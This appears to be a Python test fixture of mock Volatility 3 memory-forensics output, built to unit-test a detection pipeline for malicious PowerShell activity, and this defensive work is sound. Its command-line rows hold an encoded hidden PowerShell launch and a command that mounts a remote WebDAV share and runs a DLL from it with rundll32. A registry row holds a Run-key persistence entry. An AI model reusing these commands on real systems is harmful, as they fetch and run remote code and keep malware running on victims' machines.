"""
Mock Volatility 3 plugin output, structured exactly as `PluginResult.rows`
would be after a real run. This lets the normalizer, graph builder, and
inference engine be developed and unit-tested without volatility3
installed or a real memory image on disk.

The scenario mirrors the worked example in the paper (Section IV):
`powershell.exe` writes a persistence Run key, connects to a remote
host, and allocates an RWX memory region.
"""

from __future__ import annotations


class _NotApplicableSentinel:
    """
    Simulates Volatility 3's typed renderer sentinel objects (e.g.
    NotApplicableValue), which some plugins return instead of a plain
    Python string for "no value here" fields. Its __str__ renders as
    "-", identical in appearance to a plain string "-", but it is NOT
    equal to the string "-" under Python's == -- exactly the class of
    bug found on a real image where normalize_registry()'s
    `value_name in ("-", None)` check silently failed to filter these,
    letting 24 not-found rows through as if they were real values.
    """

    def __str__(self) -> str:
        return "-"

    def __repr__(self) -> str:
        return "<NotApplicableValue>"


class _NotAvailableSentinel:
    """
    Simulates Volatility 3's NotAvailableValue renderer objects,
    confirmed on a real image via a direct structured query
    (windows.pstree.PsTree's "Path" and "Cmd" columns both returned
    this type for oneetx.exe). Distinct from _NotApplicableSentinel
    above -- Volatility uses multiple different sentinel classes for
    different "no data" reasons, which is exactly why
    _is_missing_value() in normalizer.py checks by type-name pattern
    rather than a single hardcoded class.
    """

    def __str__(self) -> str:
        return "NotAvailable"

    def __repr__(self) -> str:
        return "<NotAvailableValue>"


# A second, benign process is included in every fixture so that tests
# and the inference engine must correctly distinguish "artifact
# exists" from "artifact triggers a behavior" -- i.e. so a trivial
# rule that fires on any process wouldn't silently pass.

PSLIST_ROWS = [
    {
        "PID": 4312,
        "PPID": 1044,
        "ImageFileName": "powershell.exe",
        "CreateTime": "2026-07-30 14:02:11 UTC",
        "Handles": 214,
        "SessionId": 1,
        "Wow64": False,
    },
    {
        "PID": 5560,
        "PPID": 812,
        "ImageFileName": "explorer.exe",
        "CreateTime": "2026-07-30 13:58:02 UTC",
        "Handles": 933,
        "SessionId": 1,
        "Wow64": False,
    },
    {
        # Real command line confirmed from a second real memory image's
        # pstree "Audit" column -- WebDAV-mounted remote DLL execution
        # via rundll32. Not base64-encoded (no -enc), so distinct from
        # the powershell.exe case above; tests
        # webdav_rundll32_remote_execution specifically, and confirms
        # execution_encoded_powershell correctly does NOT also fire on
        # this process.
        "PID": 6001,
        "PPID": 999,
        "ImageFileName": "powershell.exe",
        "CreateTime": "2026-07-30 15:10:00 UTC",
        "Handles": 88,
        "SessionId": 1,
        "Wow64": False,
    },
]

PSTREE_ROWS = [
    {
        # Column confirmed via a direct structured query
        # (adapter.run_plugin("pstree").columns) against a real image --
        # NOT by counting positions in printed CLI text, which gave a
        # wrong answer once already (see normalize_pstree()'s
        # docstring): the real path is under "Audit", not "Path".
        # Reuses powershell.exe (which already has a malfind region in
        # MALFIND_ROWS below) to test the positive case of
        # temp_dropper_with_malfind_injection: path AND malfind region
        # together should trigger it.
        "PID": 4312,
        "PPID": 1044,
        "ImageFileName": "powershell.exe",
        "Audit": "\\Device\\HarddiskVolume2\\Users\\Public\\AppData\\Local\\Temp\\powershell.exe",
        "Path": _NotAvailableSentinel(),  # confirmed: real "Path" field is a distinct, unpopulated field
    },
    {
        # Deliberately ALSO given a Temp path, but explorer.exe has no
        # malfind entry anywhere in this fixture -- this is the
        # regression case proving temp_dropper_with_malfind_injection
        # requires BOTH conditions, not path alone. (process_spawned_from_temp,
        # which only checks path, is expected to still fire on this one.)
        "PID": 5560,
        "PPID": 812,
        "ImageFileName": "explorer.exe",
        "Audit": "\\Device\\HarddiskVolume2\\Users\\Public\\AppData\\Local\\Temp\\explorer.exe",
        "Path": _NotAvailableSentinel(),
    },
]

CMDLINE_ROWS = [
    {
        "PID": 4312,
        "Process": "powershell.exe",
        "Args": (
            "powershell.exe -NoP -NonI -W Hidden -Enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA..."
        ),
    },
    {
        # Real command line, confirmed via a second real image's
        # pstree "Audit" column (verified manually against the regex
        # before this rule was added -- see webdav_rundll32_remote_execution
        # in evidence_patterns.yaml).
        "PID": 6001,
        "Process": "powershell.exe",
        "Args": (
            r"powershell.exe  -windowstyle hidden net use "
            r"\\45.9.74.32@8888\davwwwroot\ ; rundll32 "
            r"\\45.9.74.32@8888\davwwwroot\3435.dll,entry"
        ),
    },
]

# Registry Run-key write recovered via a printkey-style plugin against
# HKCU. In a real run this would come from `windows.registry.printkey`
# targeted at the Run key path, or from a registry diffing pass.
REGISTRY_ROWS = [
    {
        # PrintKey schema (assumed, unconfirmed) -- no PID/Process/
        # Operation fields; see normalize_registry()'s docstring for
        # why every row becomes an unattributed placeholder Process.
        "Key": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Name": "Updater",
        "Data": "powershell.exe -enc SQBFAFgA...",
        "Type": "REG_SZ",
    },
    # Not-found sentinel rows: PrintKey emits one of these per hive it
    # walks that doesn't contain the requested key, confirmed via real
    # output (Name literally == "-", not a real value so-named). These
    # must be filtered by normalize_registry(), not treated as real
    # Persistence evidence -- regression case for a real bug found on
    # a live memory image where 24 such rows produced 24 spurious
    # Persistence detections.
    {
        "Key": "\\REGISTRY\\MACHINE\\HARDWARE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Name": "-",
        "Data": None,
        "Type": None,
    },
    {
        "Key": "\\SystemRoot\\System32\\Config\\SAM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Name": "-",
        "Data": None,
        "Type": None,
    },
    {
        # Regression case for the real bug: PrintKey's not-found
        # sentinel returned as a TYPED object (not a plain string) on
        # one real image, which the original `value_name in ("-", None)`
        # equality check silently failed to catch -- 24 of these
        # produced 24 spurious Persistence detections. Confirmed via
        # a real graph JSON export showing value_name: "-" for an
        # artifact that WAS matched by persistence_run_key, i.e. the
        # filter had NOT caught it despite the displayed value being
        # identical to the plain-string case above, which the filter
        # does catch correctly.
        "Key": "\\REGISTRY\\MACHINE\\SYSTEM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Name": _NotApplicableSentinel(),
        "Data": _NotApplicableSentinel(),
        "Type": "Key",
    },
]

NETSCAN_ROWS = [
    {
        "PID": 4312,
        "Owner": "powershell.exe",
        "Proto": "TCPv4",
        "LocalAddr": "10.0.0.15",
        "LocalPort": 51422,
        "ForeignAddr": "185.90.10.5",
        "ForeignPort": 443,
        "State": "ESTABLISHED",
    },
]

VADINFO_ROWS = [
    {
        "PID": 4312,
        "Process": "powershell.exe",
        "Start VPN": "0x1e4f0000",
        "End VPN": "0x1e510000",
        "Protection": "PAGE_EXECUTE_READWRITE",
        "Tag": "VadS",
        "File": "N/A",  # anonymous/unbacked -- the injection-relevant case
    },
    {
        "PID": 5560,
        "Process": "explorer.exe",
        "Start VPN": "0x7ff600000",
        "End VPN": "0x7ff610000",
        "Protection": "PAGE_READONLY",
        "Tag": "Vad ",
        "File": "N/A",
    },
    {
        # Regression case: RWX memory that IS backed by a real file
        # (e.g. a JIT engine's executable page for a loaded module).
        # This must NOT trigger code_injection_rwx_region -- RWX alone
        # is common and benign; RWX + anonymous is the actual signal.
        # See normalize_vadinfo() and evidence_patterns.yaml.
        "PID": 5560,
        "Process": "explorer.exe",
        "Start VPN": "0x7ff620000",
        "End VPN": "0x7ff630000",
        "Protection": "PAGE_EXECUTE_READWRITE",
        "Tag": "VadS",
        "File": "C:\\Windows\\System32\\some_legit_module.dll",
    },
]

MALFIND_ROWS = [
    {
        # Column names confirmed against real windows.malware.malfind.Malfind
        # output. Note: no "File" column (unlike vadinfo) -- "File output"
        # is an unrelated Disabled/Enabled dump-status flag, not a path.
        # malfind's own internal heuristics already filter to
        # "suspicious" regions -- unlike vadinfo (which lists every VAD
        # entry regardless of process), only powershell.exe appears
        # here. explorer.exe deliberately does NOT appear, modeling
        # malfind's pre-filtering: a benign process with no suspicious
        # memory characteristics simply produces no malfind rows at
        # all, rather than rows that get filtered out downstream.
        "PID": 4312,
        "Process": "powershell.exe",
        "Start VPN": "0x1e4f0000",
        "End VPN": "0x1e510000",
        "Tag": "VadS",
        "Protection": "PAGE_EXECUTE_READWRITE",
        "CommitCharge": 256,
        "PrivateMemory": 1,
        "File output": "Disabled",
        "Notes": "N/A",
    },
    {
        # Positive case for code_injection_malfind_pe_header: a Notes
        # value matching real output format confirmed for oneetx.exe
        # (CyberDefenders 106-redline) -- "MZ header" indicates malfind
        # detected an embedded PE header. Distinct PID (6001, the same
        # process already used for webdav_rundll32_remote_execution)
        # to test that a process can be flagged by BOTH command-line
        # and memory-region evidence simultaneously, matching the
        # real-world pattern observed (pid=3692 in a real run:
        # confirmed via command line AND multiple malfind regions,
        # though none with an MZ header on that specific real image --
        # this fixture tests the case where one DOES have one).
        "PID": 6001,
        "Process": "powershell.exe",
        "Start VPN": "0x400000",
        "End VPN": "0x437fff",
        "Tag": "VadS",
        "Protection": "PAGE_EXECUTE_READWRITE",
        "CommitCharge": 56,
        "PrivateMemory": 1,
        "File output": "Disabled",
        "Notes": "MZ header",
    },
]

MOCK_FIXTURE: dict[str, list[dict]] = {
    "pslist": PSLIST_ROWS,
    "pstree": PSTREE_ROWS,
    "cmdline": CMDLINE_ROWS,
    "registry_run_keys": REGISTRY_ROWS,
    "netscan": NETSCAN_ROWS,
    "vadinfo": VADINFO_ROWS,
    "malfind": MALFIND_ROWS,
}
